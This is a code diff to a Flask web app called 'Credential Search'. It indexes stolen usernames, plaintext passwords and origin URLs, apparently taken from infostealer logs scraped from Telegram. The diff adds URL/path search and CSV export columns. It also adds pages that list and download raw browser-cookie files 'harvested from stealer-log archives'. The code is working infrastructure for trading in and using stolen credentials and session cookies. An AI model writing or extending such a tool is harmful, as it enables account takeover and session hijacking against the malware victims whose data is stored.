@@ -14,8 +14,10 @@ import csv
 import functools
 import io
 import os
+import re
 import sqlite3
 from pathlib import Path
+from urllib.parse import urlparse
 
 from flask import (
     Flask,
@@ -24,6 +26,7 @@ from flask import (
     redirect,
     render_template_string,
     request,
+    send_file,
     session,
     url_for,
 )
@@ -53,6 +56,53 @@ def _fmt_dt(value):
 app.jinja_env.globals["fmt_dt"] = _fmt_dt
 
 
+def _path_of(origin, domain):
+    """Path+query part of a stored origin, relative to its domain.
+
+    `origin` holds the full URL the credential was captured from (e.g.
+    'https://github.com/login?next=/x'). Returns '/login?next=/x' so the UI can
+    show the path without repeating the domain column. Returns '' when there is
+    no meaningful path to show."""
+    if not origin:
+        return ""
+    text = str(origin).strip()
+    if not text:
+        return ""
+    # android://<hash>@com.app.id/ — the hash is noise, keep the app id.
+    if text.startswith("android://"):
+        app = text.rsplit("@", 1)[-1].rstrip("/")
+        return f"android://{app}" if app else ""
+    if "://" not in text:
+        text = "//" + text
+    try:
+        parsed = urlparse(text)
+    except ValueError:
+        return ""
+    path = parsed.path or ""
+    if parsed.query:
+        path = f"{path}?{parsed.query}"
+    if not path or path == "/":
+        return ""
+    return path
+
+
+def _url_of(origin, domain):
+    """Absolute, clickable URL for a row, built from origin when possible."""
+    text = str(origin or "").strip()
+    # Any scheme at all (http, https, android, chrome-extension, ios) is already
+    # a complete identifier — returning it as-is beats prefixing a domain.
+    if "://" in text:
+        return text
+    path = _path_of(text, domain)
+    if domain:
+        return f"https://{domain}{path}" if path else f"https://{domain}"
+    return text or "#"
+
+
+app.jinja_env.globals["path_of"] = _path_of
+app.jinja_env.globals["url_of"] = _url_of
+
+
 @app.after_request
 def _no_cache(resp):
     resp.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
@@ -62,6 +112,8 @@ def _no_cache(resp):
 
 
 DB_PATH = Path(os.getenv("CREDDB_DB_PATH", "downloads/credentials.db"))
+# Raw cookie files harvested by watcher.py (downloads/_cookies/msg<id>/...).
+COOKIES_DIR = Path(os.getenv("CREDDB_COOKIES_DIR", "downloads/_cookies"))
 ADMIN_USER = os.getenv("CREDDB_WEB_ADMIN_USER", "admin")
 ADMIN_PASS = os.getenv("CREDDB_WEB_ADMIN_PASS", "")
 try:
@@ -214,6 +266,10 @@ th { background: #1f2937; color: #8b949e; font-size: 12px; text-transform: upper
 td { padding: 8px 12px; border-top: 1px solid #30363d; font-size: 13px; }
 tr:hover { background: #1c2128; }
 td.domain { color: #58a6ff; font-weight: 500; }
+td.path { color: #8b949e; font-size: 11px; font-family: monospace;
+          word-break: break-all; max-width: 260px; }
+td.path a { color: #a5d6ff; text-decoration: none; }
+td.path a:hover { text-decoration: underline; }
 td.password { color: #f0883e; font-family: monospace; }
 td.username { color: #7ee787; font-family: monospace; }
 td.added { color: #8b949e; font-size: 12px; white-space: nowrap; }
@@ -245,6 +301,7 @@ td.added { color: #8b949e; font-size: 12px; white-space: nowrap; }
 <h1>Credential Search</h1>
 <div class="nav">
   <span class="user">{{ session.user }}</span>
+  <a href="/cookies">Cookies</a>
   {% if is_admin %}<a class="admin-link" href="/admin">Pending Users</a><a class="admin-link" href="/admin/users">All Users</a><a class="admin-link" href="/admin/searches">Search Log</a><a class="admin-link" href="/admin/fingerprints">Fingerprints</a>{% endif %}
   <a href="/logout">Logout</a>
 </div>
@@ -259,6 +316,7 @@ td.added { color: #8b949e; font-size: 12px; white-space: nowrap; }
     <select name="field">
       <option value="" {% if not field %}selected{% endif %}>All fields</option>
       <option value="domain" {% if field=='domain' %}selected{% endif %}>Domain</option>
+      <option value="origin" {% if field=='origin' %}selected{% endif %}>URL / Path</option>
       <option value="username" {% if field=='username' %}selected{% endif %}>Username</option>
       <option value="password" {% if field=='password' %}selected{% endif %}>Password</option>
     </select>
@@ -268,7 +326,7 @@ td.added { color: #8b949e; font-size: 12px; white-space: nowrap; }
   {% if query %}<a class="btn btn-muted" href="/download?q={{ query }}{% if field %}&field={{ field }}{% endif %}">⬇ Download CSV</a>{% endif %}
 </div>
 <div class="qs">
-  Quick: <code>gmail.com</code> <code>facebook</code> <code>password</code> — trifield FTS5 trigram index. Use dropdown to scope to one field.
+  Quick: <code>gmail.com</code> <code>github.com/login</code> <code>facebook</code> — FTS5 trigram index over domain, username, password and full URL path. <code>host/path</code> searches match the URL column.
 </div>
 {% if recent_searches %}
 <div class="recent">
@@ -290,11 +348,12 @@ td.added { color: #8b949e; font-size: 12px; white-space: nowrap; }
 {% endif %}
 {% if results %}
 <table>
-  <tr><th>#</th><th>Domain</th><th>Username</th><th>Password</th><th>Browser</th><th>Msg</th><th>Source File</th><th>Added</th></tr>
+  <tr><th>#</th><th>Domain</th><th>Path / URL</th><th>Username</th><th>Password</th><th>Browser</th><th>Msg</th><th>Source File</th><th>Added</th></tr>
   {% for r in results %}
   <tr>
     <td>{{ offset + loop.index }}</td>
     <td class="domain">{{ r.domain }}</td>
+    <td class="path">{% set path = path_of(r.origin, r.domain) %}{% if path %}<a href="{{ url_of(r.origin, r.domain) }}" target="_blank" rel="noopener noreferrer">{{ path }}</a>{% else %}—{% endif %}</td>
     <td class="username">{{ r.username or '—' }}</td>
     <td class="password">{{ r.password }}</td>
     <td>{{ r.browser or '—' }}</td>
@@ -719,13 +778,26 @@ def download_csv():
     buf = io.StringIO()
     writer = csv.writer(buf)
     writer.writerow(
-        ["#", "Domain", "Username", "Password", "Browser", "Msg", "Source File", "Added (UTC)"]
+        [
+            "#",
+            "Domain",
+            "Path",
+            "URL",
+            "Username",
+            "Password",
+            "Browser",
+            "Msg",
+            "Source File",
+            "Added (UTC)",
+        ]
     )
     for i, r in enumerate(rows, 1):
         writer.writerow(
             [
                 i,
                 r["domain"],
+                _path_of(r.get("origin"), r["domain"]),
+                _url_of(r.get("origin"), r["domain"]),
                 r.get("username", ""),
                 r["password"],
                 r.get("browser", ""),
@@ -744,6 +816,177 @@ def download_csv():
 
 
 # ── admin ───────────────────────────────────────────────────────────────
+
+
+# ── cookies ──────────────────────────────────────────────────────────────
+
+COOKIES_INDEX_PAGE = """<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cookies — Credential Search</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+       background: #0f1117; color: #e0e0e0; padding: 20px; }
+h1 { color: #58a6ff; margin-bottom: 4px; font-size: 24px; }
+.nav { display: flex; gap: 12px; margin-bottom: 16px; font-size: 13px; align-items: center; }
+.nav a { color: #8b949e; text-decoration: none; }
+.nav a:hover { color: #e0e0e0; }
+.sub { color: #8b949e; font-size: 13px; margin-bottom: 16px; }
+table { width: 100%; border-collapse: collapse; background: #161b22;
+        border: 1px solid #30363d; border-radius: 8px; overflow: hidden; }
+th { background: #1f2937; color: #8b949e; font-size: 12px; text-transform: uppercase;
+     letter-spacing: 0.5px; padding: 10px 12px; text-align: left; }
+td { padding: 8px 12px; border-top: 1px solid #30363d; font-size: 13px; }
+tr:hover { background: #1c2128; }
+td.msg { color: #58a6ff; font-weight: 500; font-family: monospace; }
+td.size { color: #8b949e; white-space: nowrap; }
+.empty { text-align:center; padding:40px; color:#8b949e; }
+a { color: #58a6ff; text-decoration: none; }
+a:hover { text-decoration: underline; }
+</style>
+</head>
+<body>
+<h1>Cookie Files</h1>
+<div class="nav"><a href="/search">Search</a> | <a href="/logout">Logout</a></div>
+<div class="sub">Raw browser-cookie files harvested from stealer-log archives, grouped by Telegram message.</div>
+{% if msgs %}
+<table>
+  <tr><th>Message</th><th>Files</th><th>Total size</th><th></th></tr>
+  {% for m in msgs %}
+  <tr>
+    <td class="msg">{{ m.name }}</td>
+    <td>{{ m.count }}</td>
+    <td class="size">{{ '%.1f MB' | format(m.bytes / 1048576) }}</td>
+    <td><a href="/cookies/{{ m.name }}">Browse →</a></td>
+  </tr>
+  {% endfor %}
+</table>
+{% else %}
+<div class="empty">No cookie files harvested yet (or SAVE_COOKIES is off in the watcher)</div>
+{% endif %}
+</body>
+</html>"""
+
+COOKIES_MSG_PAGE = """<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>{{ msg_dir }} — Cookies</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+       background: #0f1117; color: #e0e0e0; padding: 20px; }
+h1 { color: #58a6ff; margin-bottom: 4px; font-size: 24px; font-family: monospace; }
+.nav { display: flex; gap: 12px; margin-bottom: 16px; font-size: 13px; }
+.nav a { color: #8b949e; text-decoration: none; }
+.nav a:hover { color: #e0e0e0; }
+table { width: 100%; border-collapse: collapse; background: #161b22;
+        border: 1px solid #30363d; border-radius: 8px; overflow: hidden; }
+th { background: #1f2937; color: #8b949e; font-size: 12px; text-transform: uppercase;
+     letter-spacing: 0.5px; padding: 10px 12px; text-align: left; }
+td { padding: 8px 12px; border-top: 1px solid #30363d; font-size: 13px; }
+tr:hover { background: #1c2128; }
+td.path { font-family: monospace; font-size: 12px; color: #7ee787; word-break: break-all; }
+td.size { color: #8b949e; white-space: nowrap; }
+.empty { text-align:center; padding:40px; color:#8b949e; }
+a { color: #58a6ff; text-decoration: none; }
+a:hover { text-decoration: underline; }
+</style>
+</head>
+<body>
+<h1>{{ msg_dir }}</h1>
+<div class="nav"><a href="/cookies">← All messages</a> | <a href="/search">Search</a></div>
+{% if files %}
+<table>
+  <tr><th>File</th><th>Size</th><th></th></tr>
+  {% for f in files %}
+  <tr>
+    <td class="path">{{ f.rel }}</td>
+    <td class="size">{{ '%.1f KB' | format(f.size / 1024) }}</td>
+    <td><a href="/cookies/{{ msg_dir }}/{{ f.rel }}" download>⬇ Download</a></td>
+  </tr>
+  {% endfor %}
+</table>
+{% else %}
+<div class="empty">No files</div>
+{% endif %}
+</body>
+</html>"""
+
+
+def _cookie_msg_dir(msg_dir: str) -> Path | None:
+    """Resolve a message cookie dir under COOKIES_DIR; None on bad name or
+    path traversal."""
+    if not re.fullmatch(r"[A-Za-z0-9._-]+", msg_dir or ""):
+        return None
+    base = COOKIES_DIR.resolve()
+    d = (COOKIES_DIR / msg_dir).resolve()
+    if not d.is_relative_to(base) or not d.is_dir():
+        return None
+    return d
+
+
+@app.route("/cookies")
+@login_required
+def cookies_index():
+    """List harvested cookie dirs (one per Telegram message)."""
+    msgs = []
+    if COOKIES_DIR.is_dir():
+        for d in COOKIES_DIR.iterdir():
+            if not d.is_dir() or not re.fullmatch(r"[A-Za-z0-9._-]+", d.name):
+                continue
+            files = [p for p in d.rglob("*") if p.is_file()]
+            msgs.append(
+                {
+                    "name": d.name,
+                    "count": len(files),
+                    "bytes": sum(_safe_size(p) for p in files),
+                }
+            )
+    msgs.sort(
+        key=lambda m: int(m["name"][3:]) if m["name"][3:].isdigit() else 0,
+        reverse=True,
+    )
+    return render_template_string(COOKIES_INDEX_PAGE, msgs=msgs)
+
+
+@app.route("/cookies/<msg_dir>")
+@login_required
+def cookies_msg(msg_dir: str):
+    """List cookie files inside one message's harvest dir."""
+    d = _cookie_msg_dir(msg_dir)
+    if d is None:
+        return redirect(url_for("cookies_index"))
+    files = [
+        {"rel": p.relative_to(d).as_posix(), "size": _safe_size(p)}
+        for p in sorted(d.rglob("*"))
+        if p.is_file()
+    ]
+    return render_template_string(COOKIES_MSG_PAGE, msg_dir=msg_dir, files=files)
+
+
+@app.route("/cookies/<msg_dir>/<path:rel>")
+@login_required
+def cookies_file(msg_dir: str, rel: str):
+    """Download one harvested cookie file (attachment)."""
+    d = _cookie_msg_dir(msg_dir)
+    if d is None:
+        return redirect(url_for("cookies_index"))
+    p = (d / rel).resolve()
+    if not p.is_relative_to(d) or not p.is_file():
+        return redirect(url_for("cookies_index"))
+    return send_file(p, as_attachment=True, download_name=p.name)
+
+
+def _safe_size(path: Path) -> int:
+    try:
+        return path.stat().st_size
+    except OSError:
+        return 0
 
 
 @app.route("/admin", methods=["GET", "POST"])
